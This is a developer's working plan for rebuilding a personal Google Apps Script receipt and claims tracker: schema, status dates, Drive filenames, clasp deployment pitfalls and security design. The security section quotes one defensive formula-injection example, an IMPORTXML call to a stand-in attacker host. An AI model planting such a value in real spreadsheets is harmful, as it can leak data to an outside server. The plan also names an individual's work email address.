# HelpfulForms — Clean Rebuild on a New Google Account

Working plan. The old account is frozen as a read-only archive and drained
manually; the new account is built clean rather than transferred.

## State of play

**The backend is live and verified.** Pushed to the new account, `bootstrap()`
run and re-run, all six Script Properties set, and `smokeTest()` passed 40 checks
against real Sheets and real Drive — one entry per section, each walked through
every state and back, filenames and folders confirmed at each step, then
`smokeCleanup()` removed every trace. Build order steps 1–6 are done.

**The web UI is live.** `v2/Web.js` and `v2/Index.html` are step 7: listing, the
status control and the date dialog, served as one page. Pushed, deployed,
authorised for the added `userinfo.email` scope, and driven by hand in a browser.
`npm run v2:test` covers the server side — 284 assertions now, up from 161 —
including the access check from both sides, the generated table columns, the
dialog's Today-versus-Keep wording and a status change that reports a failed
rename instead of a tick. What the harness cannot reach is the browser itself:
the CSS, the tap-to-copy and the iOS date wheel are confirmed by hand.

To redeploy after a change: `npm run v2:push`, **`npm run v2:verify`**, then a
new version of the Web app deployment.

**`clasp push` can report success while pushing nothing — always verify.** If the
server's `appsscript.json` differs from the local one at all, clasp asks before
overwriting it; with no TTY the prompt defaults to no and the push is abandoned.
Sometimes it says `Skipping push.`, which at least reads as a refusal. Sometimes
it prints **`Pushed 9 files.`** and lists all nine, having sent none. The output
cannot be trusted either way.

This is not hypothetical. `checkDocuments()` was written, committed, and named in
this file as the next thing to run — and was never on the server, so the Apps
Script editor did not list it. The trigger was **a missing trailing newline** in
the server's copy of the manifest. One byte, no semantic difference, every push
silently refused from then on.

`npm run v2:verify` pulls into a temporary directory and diffs every file clasp
would push, so "did it land" is a fact rather than a hope. On a mismatch, run
`npm run v2:push:force` — which also ends the loop, because the server then holds
the local manifest byte for byte and plain pushes go back to working.

Expect an empty table on first load. `smokeCleanup()` removed every row and
nothing can create one from the UI until step 8, so run `smokeTest()` from the
editor for something to click on, and `smokeCleanup()` afterwards.

### Step 7 verification — where it got to

Deployed, authorised, and `smokeTest()` green against real Sheets and Drive.
Confirmed by hand in the browser: sign-in, all four sections listing, the revert
dialog reading `Keep …` rather than `Today`, a load failure showing as an error
panel rather than "no data", and Cancel / Escape / tap-outside all writing
nothing.

**Two findings that turned out to be correct behaviour**, recorded because both
read as bugs the first time:

- A file failure does not roll back the status change (see Settled since).
- Visiting the web app while signed out gets Google's sign-in page, not this
  code's `Not authorized` — Google's own gate runs before `doGet`. The in-code
  check only becomes load-bearing if the manifest is ever opened up, which is
  why Siri gets its own project.

**Two defects found by clicking, both fixed:** Escape closed the dialog without
`preventDefault`, so the browser also left fullscreen; and a date could be set
for a state the row had not reached (see Settled since).

**Still outstanding — pick this up first:**

- **An extra document in `Health/Inbox`.** Two receipt-ish files, one without a
  `.txt` extension, after one `Justification URL` was deliberately broken during
  testing. The likely reading is an orphan: nothing points at that file any more,
  so transitions stopped renaming it while the receipt kept being renamed. Run
  **`checkDocuments()`** from the editor — it reports every file reference and
  whether it opens, plus any file in the tree that no row refers to. Unconfirmed
  either way.
- **Whether that is the whole story.** If `checkDocuments()` reports no orphans,
  the extra file came from somewhere else — check `rows` for two Health entries,
  i.e. `smokeTest()` having run twice.
- **`smokeCleanup()` only trashes files a row still references.** A broken
  reference leaves its file behind and reports it in `warnings`, so repair the
  cell before cleaning up.
- **Confirm the account hint fixed the broken links** (see Settled since). The
  links now carry `authuser`; what has not been checked is whether they open in
  the browser that showed them broken.
- **Not yet tested at all:** the phone (iOS date wheel, scrolling), tap-to-copy
  on the IVA reference block, the status and category filters, and Income's
  `Invoiced / Received / Logged` vocabulary rendering.

| File | Contains |
|---|---|
| `v2/Config.js` | Section config, common columns, Script Properties, filename rules |
| `v2/Core.js` | Columns by header, `setStatus`, folder moves, filename suffix chain, date validation, `withLock` |
| `v2/Entries.js` | `createEntry`, `initializeEntry`, validation, IVA claim mail, more-info mail |
| `v2/Registry.js` | Self-populating supplier registry, fuzzy matching, lookup |
| `v2/Setup.js` | `bootstrap()`, `setupScriptProperties()`, `checkScriptProperties()` |
| `v2/Smoke.js` | `smokeTest()` / `smokeCleanup()` — the live smoke test, run from the editor |
| `v2/Web.js` | `doGet`, the access check, `uiBootstrap` / `uiListEntries` / `uiSetStatus` / `uiSetEntryDate` |
| `v2/Index.html` | The page. No templating — it fetches everything through `google.script.run` |
| `v2/test/` | The harness, and `verify-push.js`. Local only — `.claspignore` keeps it out of the push |

**Not written yet:** the custom form (step 8), management module (edit / archive
/ hard delete / category lists), Siri endpoint, OCR intake. There is no `doPost`,
so the only outside surface is the signed-in UI.

**The new account** — address in `.env` as `V2_CLASP_ACCOUNT`, since this repo is
public. Its Apps Script project is
bound to the new spreadsheet, and `v2/.clasp.json` points at it — gitignored, so
the script ID stays local. Push with `npm run v2:push`, which is isolated from
the root project in both directions by the two `.claspignore` files. The
Apps Script API must be enabled once on the account before any push works — see
build order step 3.

**The two accounts no longer share a login.** `clasp login` writes one global
`~/.clasprc.json`, so a single default credential meant whichever account you
logged in as last was the one both projects pushed to. The `v2:*` scripts now
pass `--user v2`, a named credential holding the new account, while
the root `clasp:*` scripts keep the default one for the old account. Log in once
with `npm run v2:login`; check with `npm run v2:whoami`.

**Next actual step: the custom form** — build order step 8. Fields rendered from
`SECTIONS`, file upload, registry autocomplete and prefill. Until it exists the
UI can only show and move what is already there, and `createEntry` is reachable
only from the editor.

Re-running `bootstrap()` remains how you apply a config change: add a field to
`SECTIONS`, push, re-run, and the column appears. That is how `Claim Emailed`
was added after the sheets already existed.

**Headers are generated, not typed.** `sectionHeaders()` derives each sheet's
header row from `SECTIONS`, so the columns cannot drift from the code that
resolves them by name. Adding a field is a config change plus a re-run.
`bootstrap()` is idempotent — re-running it is also how you check the setup.

**Old system is frozen.** The v1 `Code.js` at the repo root and the GitHub Pages
page still serve the old account and must not be changed. `.claspignore` only
tracks the root `Code.js`, so `v2/` cannot reach it by accident.

**Open TODO in config:** Work's `Type` option list is proposed, not real.

**Google Forms is gone from v2 entirely** — decided, not hedged. `onFormSubmit`,
`installFormTrigger` and `sectionForSheet` have been deleted from `Entries.js`,
and the build order no longer creates any. `createEntry()` is the only way a row
is born. The new account has no forms to migrate; the custom form is a view in
the web app, still to be built.

---

---

## Decisions taken

| Decision | Choice |
|---|---|
| Migration | Start clean. Old account frozen as archive, worked down in parallel |
| Status model | Three states per section, one date column per state (see below) |
| UI hosting | Apps Script web app, not GitHub Pages |
| Intake | **Custom form. No Google Forms** (see below) |
| Supplier registry | Self-populating, learned from entries as they are made |
| OCR intake | Designed into the schema now, built after migration |
| Siri intake | Prompted questions + visual confirmation. Built after migration |

### Why clean rather than transfer

Sheets store Drive **URLs**. Transferring preserves file IDs, copying does not —
so a copy breaks every historical receipt link. Starting clean sidesteps the
question: legacy files never move, so legacy links never break. The old page
keeps working against the old account until its backlog is empty.

### Why there is no Google Form

The deciding argument is the supplier registry. **Google Forms cannot fill one
answer from another** — "type FNAC, get its NIF" is impossible there and trivial
in a form we control. Everything else follows from having made that choice.

Dropping Forms *deletes* work rather than adding it:

- Form dropdown syncing for expense reasons and patients — a real chunk of v1's
  complexity, and of what the management module would have been
- Four forms to create, own, link and migrate to the new account
- The `onFormSubmit` trigger and the "Forms writes the row, we finalise it" split
- `entry.NNN` field IDs, which would have made a Siri→Forms POST brittle

What it costs: file upload has to be built (`<input type="file">` → base64 →
`google.script.run` → Drive, receipts are small), and validation becomes ours —
but `missingFields()` already exists.

Since the UI was already moving into Apps Script, the form is just another view
in the same app, and Siri stops being a special case: form and Siri are two
callers of `createEntry`.

### Why the UI moves into Apps Script

Removes the two client-side secrets entirely (`SHEETS_API_KEY`,
`DELETE_API_KEY`), gets Google sign-in for free, removes CORS, and collapses two
deploy paths into one. Costs ~1–2s of first paint. For a personal tool, worth it.

---

## Principles

1. **One code path per concern.** Today there are four near-identical
   `loadXSheet` / `renderXTable` / `toggleXStatus` sets client-side and four
   toggle functions server-side. They differ only by configuration, and that
   duplication is why the four sections drifted apart. One generic
   implementation driven by a per-section config object.
2. **Columns resolved by header name, never by index.** The current code is full
   of magic numbers (`rowValues[9]`, `getRange(row, 13)`), and every layout
   difference between sheets became a special case. Look columns up by header
   text once per load; adding or reordering a column then breaks nothing.
3. **Entry creation is a function, not a trigger side effect.** `createEntry()`
   is the single way a row is born. The custom form, Siri and OCR are callers
   of it. There is no trigger in v2 at all.
4. **Never report success for work that failed.** Today a toggle returns
   `success: true` even when the file rename and email both failed. Every
   operation returns what actually happened, and the UI shows it.
5. **The client is never trusted.** The server reads status, file URLs and
   identifiers from the sheet, never from the request. (Already true after the
   layer-1 hardening; carry it forward.)
6. **Least privilege per entry point.** The signed-in UI can do everything. The
   Siri endpoint can only create entries.

---

## Schema

Every sheet gets the same spine. Section-specific fields sit between.

### Common columns (identical name and meaning in all four sections)

| Header | Type | Notes |
|---|---|---|
| `Timestamp` | datetime | When the entry was created |
| `Source` | text | `form` / `siri` / `ocr` / `manual` — how it arrived |
| `Date` | date | Date of the transaction itself |
| `Amount` | number | |
| `Currency` | text | |
| `Counterparty` | text | The other party — see labels below |
| `Status` | text | Current state. Closed vocabulary, see below |
| `Receipt URL` | url | Blank if awaiting a receipt |
| `Receipt State` | text | `attached` / `awaiting` / `none required` |
| `Notes` | text | Free text, never parsed. Absorbs v1's Description |

This is a deliberate cut from what v1 collected. Date, Amount, Currency and
Counterparty are shared by all four sections, which is why the generic renderer
can handle nearly every column without knowing which section it is showing.

### Counterparty and category

`Counterparty` is one column with a **per-section display label**, so the sheet
and code stay generic while the UI uses the natural word:

| Section | Label | Example |
|---|---|---|
| Work | Supplier | Uber |
| IVA | Retailer | FNAC |
| Health | Provider | Hospital da Luz |
| Income | Paid by | *the client* |

`category` is an optional extra classifying field, present only where it means
something. Its allowed values are a **managed list** that populates the form
dropdown — the generalisation of v1's add/delete expense reason, which gives
Health add/remove patients for free.

| Section | Category column | Managed list | Required |
|---|---|---|---|
| Work | `Expense Reason` | yes | yes |
| Health | `Patient` | yes | yes |
| Income | `Reason` | no — free text, prefilled | no |
| IVA | — | — | — |

`Status` holds only the current state name — never a date, never free text. That
is what fixes the filter dropdowns: three stable options per section instead of
one per claim date.

`Receipt State` is what makes Siri and scan-later work: a row can exist before
its receipt does.

### Status states and their dates

Each state gets **its own date column**. A single shared `Status Date` would
overwrite itself on each transition and lose the history — and for Income all
three dates are distinct business facts worth keeping.

**Work, IVA, Health**

| Order | State | Date column |
|---|---|---|
| 1 | `To Do` | — (creation is `Timestamp`) |
| 2 | `Claimed` | `Claimed Date` |
| 3 | `Settled` | `Settled Date` |

**Income**

| Order | State | Date column |
|---|---|---|
| 1 | `Invoiced` | `Invoiced Date` |
| 2 | `Received` | `Received Date` |
| 3 | `Logged` | `Logged Date` |

### Date rules

Every date behaves the same way — there is no auto/manual split:

- Selecting a state **prompts for its date, pre-filled with today**. One tap to
  accept, but it is always seen before it is written.
- Pre-filling rather than writing silently matters because `Invoiced`,
  `Received` and `Settled` are usually **backdated**. A silent "today" would be
  wrong most of the time and never noticed.
- Any date the row **has reached** can be edited later without changing state.
  A date for a *later* state is refused — see below.

**The date dialog.** Selecting a state opens a small dialog:

```
        Mark as Settled

  ┌──────────────────────────────┐
  │        Today — 8 Aug         │   ← primary, one tap, done
  └──────────────────────────────┘

  or pick a date

  ┌──────────────┐  ┌────────────┐
  │  08/08/2026  │  │     OK     │
  └──────────────┘  └────────────┘

           Cancel
```

The date field is a native `<input type="date">`, so on iOS it opens the system
date wheel rather than anything custom.

When the target state **already has a date** — which is the case when reverting
— the dialog pre-fills with that existing date and the primary button reads
`Keep 15 Jan` rather than `Today`. That keeps the dialog honest about the
"only fill if blank" rule, so reverting never silently re-stamps.

### Drive layout and filenames

Files follow the status. Each state has a folder, and reaching a state appends
to the filename, so the name carries its own audit trail.

```
<root>/<Section>/Inbox       form uploads land here (To Do)
<root>/<Section>/Claimed
<root>/<Section>/Settled
<root>/<Section>/Archived    archived and soft-deleted
```

Base name: `YYMMDD_Counterparty_Amount_<document>.ext`

```
on upload   250115_HospitalDaLuz_3-45_receipt.pdf
Claimed     250115_HospitalDaLuz_3-45_receipt_Claimed_04-01-2026.pdf
Settled     250115_HospitalDaLuz_3-45_receipt_Claimed_04-01-2026_Settled_20-01-2026.pdf
reverted    250115_HospitalDaLuz_3-45_receipt_Claimed_04-01-2026.pdf
```

The chain is **rebuilt from the row's date columns** on every transition, not
edited in place. Going forward lengthens it, reverting shortens it, and both use
one code path — so there is no separate undo to drift out of step.

### Amounts in filenames

Rendered to two decimal places with the decimal point replaced: `3.4` → `3-40`,
`3.456` → `3-46`, `12` → `12-00`.

Two reasons. A sheet cell holding `3.4500001` would otherwise land in the
filename verbatim. And a name containing `3.45` has two dots, which invites
naive `split('.')` extension parsing to break — in this codebase, or in any
Shortcut, script or OCR step added later. One dot per filename, always the
extension.

Cost: searching Drive means typing `3-45`. Controlled by `DECIMAL_IN_FILENAME`
in `Config.js` — set it to `'.'` to keep the dot.

### Status control replaces Done/Undo

Three states cannot be a two-way toggle, so each row gets a **status selector**
rather than Done/Undo buttons.

- **"Undo" stops existing as a concept.** Going back is just selecting an
  earlier state, which removes the four inconsistent undo implementations.
- Correcting a mistake is the same action as making it — no special path.

### Reverting must not rewrite history

Reverting is expected to be common (mis-taps on a phone), so it has explicit
rules rather than falling out of the implementation:

- Moving to an earlier state **clears the date columns of every state after the
  target**, so the row never claims a date for a state it is no longer in.
- The target state's own date is **only filled if blank**. Reverting Settled →
  Claimed keeps the original `Claimed Date` rather than re-stamping today.
- Any file rename applied by the states being reversed past is undone.

### Reversibility instead of confirmations

Because every state change is freely reversible, state changes get **no
confirmation dialog** — confirmations on frequent actions just train you to tap
through them. Only genuinely irreversible actions (archiving) confirm.

### Section-specific fields — and why they stay

**The forms exist so that a claim can be submitted without reopening the
receipt.** Número and Emitente NIF get retyped into Finanças; a health claim
needs both the treatment date and the invoice date. Capturing them once at entry
is the whole point of the system.

So completeness beats minimalism. Do not trim these back to a tidy shared core —
a dropped field becomes a receipt you have to go and find.

| Section | Extra fields |
|---|---|
| Work | none |
| IVA | `Número`, `Emitente NIF`, `IVA Amount` |
| Work | `Type` (Taxi, Train, Flight, Hotel, …) |
| Health | `Invoice Date`, `Type` (Doctor, Dentist, …) |
| Income | none — its extra dates are state dates |

**Health `Service Type`** is a deliberately short list: Doctor, Dentist,
Optician, Prescription, Exam/Test. It is **not** the insurer's list, which is
huge and multi-level and is chosen at submission time. This one exists for your
own tracking and is optional.

**Income** is Date, Counterparty, Amount, Currency, optional Reason, plus its
three state dates. `Received Date` and `Logged Date` are ordinary editable
fields shown in the form — settable at entry or later — as well as being filled
by the status control. So an income entry can arrive already `Received`.

`Amount` holds the total in every section; IVA's VAT figure is its own
`IVA Amount` field. `Date` holds the transaction date — for Health that is the
**treatment** date, with the invoice date alongside it.

### Reference values are shown, not stored

`Tipo` and `Importados` are identical on every IVA row, so they were never
really data — they were a reminder. They stop being columns and become a
**reference block displayed in the section**, alongside the NIFs you have to
retype into Finanças and cannot always remember:

| Label | Source |
|---|---|
| JALLC NIF | `REF_JALLC_NIF` |
| My NIF | `REF_MY_NIF` |
| Tipo | `REF_IVA_TIPO` |

Shown with **tap to copy**, since the whole point is transcribing them into
another system.

Values live in Script Properties rather than in `Config.js`. They are identifiers
rather than secrets, but the repository is public and there is no reason to put
a personal NIF into it twice — note that v1's `index.html` already contains
these values publicly, which is worth cleaning up when the old system retires.

### Health has two documents, not one

A health claim needs proof the expense was **necessary** and proof it was
**paid** — usually a prescription or invoice, plus a payment receipt. v1 called
the second file "Details", which hid what it was for.

| Column | Label | Filename suffix |
|---|---|---|
| `Justification URL` | Prescription / Invoice | `_justification` |
| `Receipt URL` | Proof of payment | `_receipt` |

### What v2 does drop

- **Health** — `Original Receipt Filename` / `Original Details Filename` (M/N).
  Existed only for the iCloud Shortcut, which is cancelled.
- **All** — `Description` becomes `Notes`, and is optional.

---

## Architecture

### Server (Apps Script)

```
Config
  SECTIONS = { work: {...}, iva: {...}, health: {...}, income: {...} }
    sheet name, section fields, filename pattern, what Done does

Core
  createEntry(section, fields, source)   one way a row is born
  setStatus(section, row, done)          one way status changes
  archiveReason(section, reason)         rows to archive sheet, files to Archived
  resolveColumns(sheet)                  header name -> index, cached per load

Callers
  google.script.run    -> createEntry / setStatus / archive / list  (signed in)
  doPost (Siri)        -> createEntry only                          (device key)
  ocrIntake(file)      -> createEntry(...)                          (later)
```

There is no trigger anywhere. Nothing writes a row except `createEntry`, which
is what makes "one code path per concern" hold rather than merely being stated.

`setStatus` replaces four divergent toggle functions. What each transition does
becomes config, not code:

| | Rename receipt | Email | v1 did |
|---|---|---|---|
| Work | prefix on `Claimed` | **on entry creation** | emailed on form submit |
| IVA | prefix on `Claimed` | **on entry creation**, not on status change | emailed on toggle to Claimed |
| Health | prefix on `Claimed`, both files | no | emailed the iCloud Shortcut — cancelled |
| Income | n/a | no | no |

**Claim emails move to `createEntry`** — they fire when the entry is made and
its receipt is attached, rather than when the status changes. That decouples
them from status entirely, so no transition has a side effect beyond renaming,
and re-selecting a state can never re-send mail. Recipients become Script
Properties rather than the hardcoded `jacqueline.eaton@nato.int`:
`IVA_CLAIM_RECIPIENT` and `WORK_CLAIM_RECIPIENT`.

**Work's claim email nearly got lost.** v1 mailed every work expense on form
submission from `sendWorkExpenseEmail()`, receipt attached — and an earlier draft
of this table recorded Work as sending no mail, with no reason given. It was an
oversight, not a decision. Restored as an `emailOnCreate` config exactly like
IVA's, so the two now share one code path. Health is the only section that
genuinely loses its v1 mail, because that mail existed solely to drive the
cancelled iCloud Shortcut.

Both are gated: nothing is sent while required fields are blank or the receipt
is still missing. An incomplete entry gets a "more info needed" note instead.

Moving back to an earlier state reverses the rename. Because that is now the
same code path as moving forward, it cannot drift the way four hand-written
undos did.

### Client

**Built** — `v2/Index.html`, one page served by the Apps Script web app, using
`google.script.run` instead of `fetch`: no API key, no CORS, caller identity
known server-side.

One render function driven by section config. Explicit loading, empty and error
states, so a failure stops looking identical to "no data".

Two things the page deliberately does not do:

- **No templating.** It fetches everything through `google.script.run`, so there
  is one path by which data reaches the client rather than two, and no sheet
  value is ever interpolated into markup. `uiBootstrap()` is one round trip for
  the four sections' shapes; `uiListEntries()` is one range read per section.
- **No optimistic rendering.** Every action returns the row as the sheet now
  holds it, re-read rather than assumed, and the page re-renders from that. This
  is what makes "never report success for work that failed" visible: a status
  change that moved the status but could not rename the file shows the new state
  *and* says which document failed.

**The dialog's wording is decided server-side.** Each row comes back with one
option per state carrying that state's date column and the date the row already
holds for it, so the primary button can read `Keep 5 Mar` instead of `Today`
without a second round trip — and so the harness can test it, which it could not
if the rule lived in the page. That wording is not cosmetic: `setStatus` only
fills a blank date, so a button saying "Today" on the revert path would be
claiming something the server is about to refuse to do.

### Supplier registry

A `Suppliers` sheet that **populates itself**. Nothing is entered up front:
every entry teaches it, so it is current by construction rather than by
maintenance.

| Column | Purpose |
|---|---|
| `Name` | Canonical name |
| `Type` | Default service type, e.g. Uber → Taxi, White Clinic → Dentist |
| `NIF` | IVA retailers only |
| `Aliases` | Recurring mishearings, mapped once and fixed forever |
| `Times Used`, `Last Used` | Orders autocomplete by what you actually use |

Serves the form (autocomplete, prefill Type and NIF) and Siri (matching a
misheard name to something real).

**Matching is tiered**, strongest first: exact after normalising (1.00), alias
(0.95), one name containing the other scaled by length ratio (0.75–0.95), then
edit-distance similarity. Accents, case and punctuation are ignored throughout.

**Nothing prefills below 0.85 confidence.** A wrong NIF means a rejected claim,
which is far worse than a blank field — below the bar we keep what was actually
said and let the completion step resolve it. Measured behaviour:

| Heard | Stored | Score | |
|---|---|---|---|
| `wite clinic` | White Clinic | 0.92 | autofills |
| `the white clinic` | White Clinic | 0.90 | autofills |
| `white clinique` | White Clinic | 0.79 | holds |
| `fnak` | FNAC | 0.75 | holds |
| `uber` | Uber Eats | 0.84 | holds |

Short names are inherently brittle — one wrong letter in four tanks the ratio.
That is what `Aliases` is for: correct it once, and it resolves at 0.95 forever.

**What the registry prefills differs per section**, because "usually the same"
is not true everywhere:

| Section | Prefills | Why |
|---|---|---|
| IVA | `Emitente NIF` | A fact about the retailer |
| Health | `Type` | White Clinic is usually Dentist |
| Income | `Reason` | Currently fixed per payer |
| Work | `Type` | Uber is always Taxi — but **not** `Expense Reason`, since the same supplier serves many trips |

Income's `Reason` is therefore free text rather than a managed list: you enter
it once per payer and it fills itself thereafter, which removes the reason it
would otherwise go unfilled.

**Types are cleared on conflict, not overwritten.** A clinic doing both
dentistry and exams has no reliable default, so the second differing type blanks
it. A field that prefills the wrong value is worse than one that prefills
nothing.

### Management module

v1's only management action was add/delete expense reason. v2 gets a proper
management surface, because mistakes are normal and correcting them shouldn't
mean opening the spreadsheet on a phone.

**Edit a row.** Any field, in place, from the table. Editing is not a special
mode — the same validation as `createEntry` applies, so an edited row can never
be less valid than a created one.

**Delete a row — archives it.** Deleting from the main table moves the row to
the section's archive sheet marked `deleted` and moves its documents to the
`Archived` folder. It does **not** remove data. Given how easy it is to mis-tap,
a one-click unrecoverable delete of the wrong row is not worth the convenience,
and the row you meant to remove is junk anyway.

**Hard delete — really deletes, and only from the archive.** The management
module can permanently destroy a row and its files.

The safeguard is structural rather than a scarier dialog: **hard delete only
operates on rows that are already archived.** Live data can never be destroyed
in one action; you archive first, then purge from the archive. Two deliberate
steps, in two different places, with a confirmation on the second.

Drive files are moved to Drive's trash rather than removed outright, which keeps
a 30-day grace period. Storage is only reclaimed when the trash empties — if
space is urgent, permanent removal is a config switch.

| Action | Where | Reversible | Confirms |
|---|---|---|---|
| Change status | table | yes, freely | no |
| Edit a field | table | yes, by editing back | no |
| Delete a row | table | yes — lands in archive | yes |
| Hard delete | management, archived rows only | no (30 days in Drive trash) | yes |
| Archive a category value | management | yes | yes |

**Manage category values.** Add and remove the allowed values of a section's
category field, which the form's dropdown reads directly — there is no form to
keep in sync, which is most of what this used to cost. Works for Work's
Expense Reason and Health's Patient; hidden for IVA and Income, which have no
category.

### Siri intake

**Decision: prompted questions, then a visual confirmation.** Not one dictated
sentence.

The reason is not recognition accuracy, it is memory: prompts are a **checklist**.
A field the Shortcut insists on asking for cannot be forgotten, whereas a single
sentence quietly omits whatever you did not think to say.

One Shortcut per section, named so the phrase is natural — "Log expense",
"Log health claim". No "which section?" question.

```
You:   Hey Siri, log health claim
Siri:  Who is it for?        -> tap Phoenix from a list
Siri:  Which provider?       -> "White Clinic"
Siri:  How much?             -> "70"

       ┌──────────────────────────────┐
       │  Health claim                │
       │  Phoenix · White Clinic      │
       │  €70.00 · today              │
       │        Save    Cancel        │
       └──────────────────────────────┘
```

**Refinements that follow from choosing prompts:**

- **Do not ask for the date.** Default to today and show it in the confirmation.
  Most entries are same-day, and the confirmation is where an exception gets
  caught. One fewer prompt every time.
- **Category fields are a list, not dictation.** Expense Reason and Patient are
  taps, which cannot be misheard. The list is **fetched from the server**, so
  adding a patient never means editing the Shortcut.
- **Amount uses the Number input type**, so words can never arrive where digits
  belong. Amount errors are the dangerous ones — a supplier typo is obvious in a
  list, "29.80" instead of "298" is not.
- **Currency defaults to EUR** and is not asked.

**Siri captures the core only** — counterparty, amount, category. Número, NIF,
invoice date and documents are left for the completion step. This keeps the
Shortcuts stable: adding a field to a section never requires re-editing them,
because they only ever ask for the same few things.

> Note: an Alert action is right here, where you invoked the Shortcut and are
> looking at the phone. It is wrong in an unattended *automation*, where it
> stalls waiting for a tap — which is why one was removed from the v1 iCloud
> Shortcut.

### Partial entries are the safety net

**An entry does not have to be complete.** Whatever Siri did not capture stays
blank, `Receipt State` becomes `awaiting`, and an email arrives with a
**completion link** that opens the form on that row.

**Built.** `sendCompletionRequest()` fires from `initializeEntry` whenever a
required field is blank *or* a document is still awaited. It lists what is
outstanding, repeats what was captured, and links to the row. Until the web form
exists the link points at the spreadsheet row; when the form is built, only that
URL changes.

It goes to **`COMPLETION_EMAIL_RECIPIENT`, which is deliberately not
`IVA_CLAIM_RECIPIENT`** — this is a note to yourself and must never land in front
of whoever processes claims. Both are Script Properties; the values live in
`.env` as `V2_COMPLETION_EMAIL_RECIPIENT` and `V2_IVA_CLAIM_RECIPIENT`.

So a mishearing costs one tap on a link rather than a failed capture. It is also
why the registry must hold rather than guess: a blank you will see and fix beats
a confident wrong match that silently corrupts the entry.

The completion link is only possible without Google Forms — Forms cannot reopen
an existing row for editing in any usable way.

**Learning from corrections.** When a completion edit changes the supplier from
what was heard, that spoken form is a candidate `Alias`. Adding it — offered,
not automatic — means the same mishearing resolves next time.

### Security

| Entry point | Deployment | Auth | Can do |
|---|---|---|---|
| Web UI | This project. Execute as me, **restricted to my account** | Google sign-in, **re-checked in the code** on every call | Everything |
| Siri | **A separate project** (see below). Execute as me, anyone with key | Key held on device only | `createEntry` only |

No secret ever reaches a public file. The Siri key lives in the Shortcut and in
Script Properties, nowhere else.

**Scopes are pinned in `appsscript.json`** rather than inferred, so widening
them is a visible diff instead of a side effect of adding a line of code:
`spreadsheets`, `drive`, `script.send_mail`, and `userinfo.email` since step 7.
Mail goes through **`MailApp`, not `GmailApp`** — both send as you, but
`GmailApp` asks for `https://mail.google.com/`, full read and write of the whole
mailbox, which this code has no business holding.

### The UI's own access check — corrected while building it

This plan said `doGet` should check `Session.getEffectiveUser()`. **That would
have been a check that always passes.** Under "execute as me" the effective user
*is* the deploying account, whoever is visiting — so comparing it to anything is
comparing me to me. The caller is `Session.getActiveUser()`, and that is what
`uiAccessCheck()` in `Web.js` reads:

- The allowed set is `UI_ALLOWED_EMAILS` when set, otherwise just the effective
  user — so leaving it unset means "only me" rather than "anyone".
- A blank active user is denied, and so is a failure to read one at all: a
  missing scope or a revoked authorisation produces a denial rather than an
  exception something might carry on from.
- **Every function the page can call checks for itself**, not just `doGet`.
  `google.script.run` reaches any global in the project — including
  `bootstrap()` and `smokeCleanup()` — so the deployment setting cannot be the
  only gate.

**And the "or" in the Siri note below resolves to its second branch.** Under
`ANYONE_ANONYMOUS` Google signs nobody in, so `getActiveUser()` is blank for
*everyone including me*; a `doGet` that checks the caller then locks me out too.
That is the right direction to fail, but it means opening the manifest for Siri
cannot be rescued by a check inside `doGet`. **Siri gets its own Apps Script
project.** Decided, not a preference.

Two constraints follow for step 11: that separate project, and `doPost` still
whitelisting its fields (below).

**Every value written to a sheet passes through `safeCellValue`.** A counterparty
of `=IMPORTXML("http://evil.test","//x")` is stored as text, not executed. This
covers `createEntry` and the registry — the two paths that write data that came
from outside.

Two constraints to respect when the Siri endpoint is built:

- **`doPost` must not accept file columns.** `extractFileId` will take any Drive
  ID out of a supplied string, and the script runs as you, so a key holder
  passing a URL for a file of yours would have it renamed and moved into
  HelpfulForms. Siri sends the core fields only; whitelist them explicitly
  rather than passing its payload to `createEntry` unfiltered.
- **One manifest, two deployments — so Siri gets its own project.**
  `webapp.access` is per project, not per deployment, so opening it to
  `ANYONE_ANONYMOUS` for Siri also opens the UI deployment, and no check inside
  `doGet` can compensate (see above: anonymous access blanks the caller's
  identity for everyone). A second Apps Script project is the only version of
  this that stays safe.

---

## Build order

Each step should leave the system working.

1. **New account + storage confirmed** — done. Quota managed by hand.
2. **Spreadsheet + bound Apps Script project** — done. `v2/.clasp.json` points
   at it.
3. **Enable the Apps Script API on the new account**, once, at
   <https://script.google.com/home/usersettings>. A fresh Google account has it
   off, and `clasp push` fails with "User has not enabled the Apps Script API"
   until it is on. Note that `clasp pull` works without it, so a successful pull
   is not evidence that push will work. Check the avatar before toggling — with
   two accounts signed in it is easy to enable it on the wrong one.
4. **Push, verify, then run `bootstrap()`.** `bootstrap()` creates the four
   sheets, their generated header spine, `Suppliers`, the Drive tree, and
   `ROOT_FOLDER_ID`. Always follow a push with `npm run v2:verify`: clasp
   abandons the push whenever the remote manifest differs, and reports either
   `Skipping push.` or a wholly untrue `Pushed 9 files.` See State of play.
5. **Script Properties**, verified with `checkScriptProperties()`. Before any
   entry exists, because creating an entry can send mail and every upload needs
   the root folder. Setting them in **Project Settings → Script Properties** is
   preferred over `setupScriptProperties()`: a value typed into the editor UI
   cannot be committed to a public repo by accident.
6. **`smokeTest()` from the editor.** The editor can only run zero-argument
   functions, so `v2/Smoke.js` wraps it: one entry per section, walked
   through every state and back, checking filenames and folders in real Drive
   at each step. `smokeCleanup()` then removes exactly the rows it made, their
   files, and the registry entry it taught. Confirm this before building
   anything on top.
7. **Web UI**: listing and the status control — **done**. `v2/Web.js` and
   `v2/Index.html`, deployed execute-as-me with access restricted to myself, and
   authorised for the `userinfo.email` scope the manifest gained. Sign-in,
   listing, status changes and dates confirmed in a browser; the phone and the
   filters are still unchecked (see State of play). Nothing can create a row from
   the UI until step 8, so use `smokeTest()` for rows to click on and
   `smokeCleanup()` afterwards.
8. **Custom form** as a view in the same app: fields rendered from `SECTIONS`,
   file upload, registry autocomplete and prefill.
9. **Management module**: edit, delete-to-archive, hard delete, category lists.
10. **Cutover** — see below.
11. **Siri Shortcut** in its own Apps Script project — not a second deployment
    of this one. See Security: anonymous access is per project, and it blanks the
    caller's identity for everyone.
12. **OCR intake.**

Steps 1–10 restore what you have today, cleanly. 11 and 12 are new capability
and can wait.

## Cutover

1. New system verified with test entries; delete the test rows.
2. Turn **off** "Accepting responses" on all four old forms — prevents
   split-brain where some claims land in each account.
3. New submissions go to the new account from here.
4. Old GitHub Pages page stays live and untouched, pointed at the old account,
   used only to work down the remaining backlog.
5. When the old backlog reaches zero: unpublish the old page, delete the old web
   app deployment, keep the old sheet and Drive as archive.

## What stays frozen

Once cutover happens, **stop changing the old system**. Every change there costs
a push → version → manual UI deploy on the thing you depend on to finish the
backlog. Its known issues are accepted, not fixed:

- Silent load failures, toggles reporting false success
- Filter dropdowns growing one option per claim date
- Health M/N drift

**To stop the iCloud emails without touching code:** delete the `ICLOUD_EMAIL`
